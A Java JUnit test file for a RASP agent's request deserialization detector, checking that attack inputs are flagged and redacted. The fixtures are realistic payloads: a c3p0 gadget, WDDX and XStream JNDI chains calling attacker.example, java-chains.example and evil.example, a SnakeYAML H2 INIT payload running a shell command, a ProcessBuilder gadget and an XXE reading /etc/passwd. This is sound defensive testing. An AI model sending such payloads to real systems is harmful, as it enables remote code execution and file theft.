package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** Request type binding and serialized input rules. */
final class RequestDeserializationDetectorTest {
  private final DetectorEngine engine = new DetectorEngine();

  @Test
  void detectsGzipBase64JsfViewStateSerializedClientState() {
    var payload = "H4sIAAAAAAAAA1vzloG1AAAWmZJ6BQAAAA==";
    var context =
        new RequestContext(
            "POST",
            "/index.xhtml",
            "javax.faces.ViewState=" + payload + "&submit=Login",
            Map.of("javax.faces.ViewState", List.of(payload), "submit", List.of("Login")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_serialized_client_state");
    assertEquals("javax.faces.ViewState", result.orElseThrow().details().get("parameter"));
    assertEquals("base64+gzip", result.orElseThrow().details().get("encoding"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals("5", result.orElseThrow().details().get("payloadLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("javax.faces.ViewState"));
    assertTrue(result.orElseThrow().request().query().contains("javax.faces.ViewState=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains(payload));
  }

  @Test
  void detectsBase64ViewStateSerializedClientState() {
    var payload = "rO0ABXA=";
    var context =
        new RequestContext(
            "POST",
            "/faces/login",
            "",
            Map.of("viewState", List.of(payload)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_serialized_client_state");
    assertEquals("viewState", result.orElseThrow().details().get("parameter"));
    assertEquals("base64", result.orElseThrow().details().get("encoding"));
  }

  @Test
  void ignoresSerializedBytesOutsideClientStateParameter() {
    var context =
        new RequestContext(
            "POST",
            "/submit",
            "",
            Map.of("payload", List.of("rO0ABXA=")),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresRememberMeCookieThatDecryptsToNonObjectStream() {
    var context =
        new RequestContext(
            "GET",
            "/login",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "cookie",
                "rememberMe=AAECAwQFBgcICQoLDA0OD0Hmlh7Qh11DXATvrT9sX58="));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsTypedParameterDeserialization() {
    String parameter = "+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource";
    String value =
        "{\"userOverridesAsString\":\"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/jsonws/invoke",
            "cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D"
                + "&%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource="
                + "%7B%22userOverridesAsString%22%3A%22HexAsciiSerializedMap%3Aaced00057372003d636f6d2e6d6368%22%7D",
            Map.of(
                "cmd",
                List.of("{\"/expandocolumn/add-column\":{}}"),
                parameter,
                List.of(value)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_parameter_deserialization");
    assertEquals("+defaultData", result.orElseThrow().details().get("parameter"));
    assertEquals(
        "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        result.orElseThrow().details().get("class"));
    assertEquals(String.valueOf(value.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get(parameter));
    assertTrue(result.orElseThrow().request().query().contains("%2BdefaultData:"));
    assertTrue(result.orElseThrow().request().query().contains("=[redacted]"));
    assertTrue(!result.orElseThrow().request().query().contains("HexAsciiSerializedMap"));
  }

  @Test
  void ignoresBenignTypedParameter() {
    var context =
        new RequestContext(
            "POST",
            "/api/jsonws/invoke",
            "%2BdefaultData:com.example.portal.SafeColumn=%7B%22name%22%3A%22display%22%7D",
            Map.of("+defaultData:com.example.portal.SafeColumn", List.of("{\"name\":\"display\"}")),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsWddxTypedPayloadJndiDeserialization() {
    var payload =
        "<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'>"
            + "<var name='dataSourceName'><string>ldap://attacker.example/Exploit</string></var>"
            + "<var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>";
    var context =
        new RequestContext(
            "POST",
            "/CFIDE/adminapi/accessmanager.cfc",
            "method=foo&_cfclient=true&argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of(
                "content-type",
                "application/x-www-form-urlencoded",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_payload_deserialization");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("argumentCollection", result.orElseThrow().details().get("parameter"));
    assertEquals("com.sun.rowset.JdbcRowSetImpl", result.orElseThrow().details().get("class"));
    assertEquals("jndi:ldap", result.orElseThrow().details().get("trigger"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(
        List.of("[redacted]"),
        result.orElseThrow().request().parameters().get("argumentCollection"));
    assertTrue(result.orElseThrow().request().query().contains("argumentCollection=[redacted]"));
    assertFalse(result.orElseThrow().request().query().contains("JdbcRowSetImpl"));
    assertFalse(result.orElseThrow().request().query().contains("ldap://"));
  }

  @Test
  void detectsHertzBeatCve202442323SnakeYamlImportTypedPayload() {
    var payload =
        """
        !!org.h2.jdbc.JdbcConnection [ "jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\\"touch /tmp/success\\")\\; }$$\\;CALL EXEC ()\\;", [], "a", "b", false ]
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/monitors/import",
            "",
            Map.of(),
            Map.of("content-type", "application/x-yaml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_typed_payload_deserialization");
    assertEquals("body", result.orElseThrow().details().get("source"));
    assertEquals("body", result.orElseThrow().details().get("parameter"));
    assertEquals("org.h2.jdbc.JdbcConnection", result.orElseThrow().details().get("class"));
    assertEquals("jdbc-h2-init", result.orElseThrow().details().get("trigger"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals("", result.orElseThrow().request().body());
  }

  @Test
  void detectsXmlPolymorphicProcessBuilderGadgetPayload() {
    var payload =
        """
        <map>
          <entry>
            <jdk.nashorn.internal.objects.NativeString>
              <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                    <is class="javax.crypto.CipherInputStream">
                      <cipher class="javax.crypto.NullCipher">
                        <serviceIterator class="javax.imageio.spi.FilterIterator">
                          <next class="java.lang.ProcessBuilder">
                            <command>
                              <string>touch</string>
                              <string>/tmp/success</string>
                            </command>
                          </next>
                        </serviceIterator>
                      </cipher>
                    </is>
                  </dataSource>
                </dataHandler>
              </value>
            </jdk.nashorn.internal.objects.NativeString>
          </entry>
        </map>
        """;
    var context =
        new RequestContext(
            "POST",
            "/orders/3/edit",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("java.lang.ProcessBuilder", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsXstreamJdbcRowSetJndiXmlPayload() {
    var payload =
        """
        <sorted-set>
          <javax.naming.ldap.Rdn_-RdnEntry>
            <type>ysomap</type>
            <value class="com.sun.org.apache.xpath.internal.objects.XRTreeFrag">
              <m__DTMXRTreeFrag>
                <m__dtm class="com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM">
                  <m__incrementalSAXSource class="com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces">
                    <fPullParserConfig class="com.sun.rowset.JdbcRowSetImpl" serialization="custom">
                      <javax.sql.rowset.BaseRowSet>
                        <default>
                          <dataSource>ldap://java-chains.example:50389/x</dataSource>
                        </default>
                      </javax.sql.rowset.BaseRowSet>
                    </fPullParserConfig>
                  </m__incrementalSAXSource>
                </m__dtm>
              </m__DTMXRTreeFrag>
            </value>
          </javax.naming.ldap.Rdn_-RdnEntry>
        </sorted-set>
        """;
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("com.sun.rowset.JdbcRowSetImpl", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsXstreamRmiRegistryXmlPayload() {
    var payload =
        """
        <java.util.PriorityQueue serialization="custom">
          <java.util.PriorityQueue>
            <default>
              <size>2</size>
            </default>
            <javax.naming.ldap.Rdn_-RdnEntry>
              <value class="com.sun.xml.internal.ws.api.message.Packet" serialization="custom">
                <message class="com.sun.xml.internal.ws.message.saaj.SAAJMessage">
                  <sm class="com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl">
                    <nullIter class="com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator">
                      <aliases class="com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl">
                        <candidates class="com.sun.jndi.rmi.registry.BindingEnumeration">
                          <ctx>
                            <registry class="sun.rmi.registry.RegistryImpl_Stub" serialization="custom">
                              <java.rmi.server.RemoteObject>
                                <string>UnicastRef</string>
                                <string>evil.example</string>
                                <int>1099</int>
                              </java.rmi.server.RemoteObject>
                            </registry>
                            <host>evil.example</host>
                            <port>1099</port>
                          </ctx>
                        </candidates>
                      </aliases>
                    </nullIter>
                  </sm>
                </message>
              </value>
            </javax.naming.ldap.Rdn_-RdnEntry>
          </java.util.PriorityQueue>
        </java.util.PriorityQueue>
        """;
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("content-type", "application/xml", "user-agent", "JUnit"),
            payload);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xml_polymorphic_gadget");
    assertEquals("sun.rmi.registry.RegistryImpl_Stub", result.orElseThrow().details().get("class"));
    assertEquals("xml-class-attribute", result.orElseThrow().details().get("source"));
    assertEquals(String.valueOf(payload.length()), result.orElseThrow().details().get("bodyLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignTypedPayloadSafeClass() {
    var payload = "{\"@type\":\"com.example.SafeBean\",\"homepage\":\"ldap://example.com/docs\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/object/import",
            "argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of("content-type", "application/json", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresTypedPayloadWithoutDeserializationTrigger() {
    var payload =
        "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"jdbc:h2:mem:test\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/object/import",
            "argumentCollection=" + payload,
            Map.of("argumentCollection", List.of(payload)),
            Map.of("content-type", "application/json", "user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSolrCve201712629XmlParserXxePayload() {
    var xml =
        """
        <?xml version="1.0"?>
        <!DOCTYPE message [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <message>&xxe;</message>
        """;
    var encodedXml =
        "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20message%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cmessage%3E%26xxe%3B%3C%2Fmessage%3E";
    var context =
        new RequestContext(
            "GET",
            "/solr/demo/select",
            "wt=xml&defType=xmlparser&q=" + encodedXml,
            Map.of(
                "wt",
                List.of("xml"),
                "defType",
                List.of("xmlparser"),
                "q",
                List.of(xml)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_xxe_payload");
    assertEquals("q", result.orElseThrow().details().get("parameter"));
    assertEquals("file", result.orElseThrow().details().get("scheme"));
    assertEquals(String.valueOf(xml.length()), result.orElseThrow().details().get("xmlLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("q"));
    assertTrue(result.orElseThrow().request().query().contains("q=[redacted]"));
  }
}
